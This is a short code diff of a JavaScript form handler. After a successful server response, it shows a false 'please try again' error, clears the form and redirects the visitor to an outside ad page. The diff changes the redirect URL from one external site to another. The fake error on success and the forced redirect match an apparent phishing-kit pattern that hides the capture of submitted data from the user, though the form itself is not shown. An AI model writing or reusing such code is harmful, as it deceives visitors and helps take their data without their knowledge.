@@ -67,7 +67,7 @@ document.addEventListener("DOMContentLoaded", () => {
         if (response.ok) {
           alert("⛔ please try again");
           form.reset();
-          window.location.href = "https://omg10.com/4/10060108";
+          window.location.href = "https://intelseller.com/ads.html";
         } else {
           const errorText = await response.text();
           console.error("Server Error:", errorText);
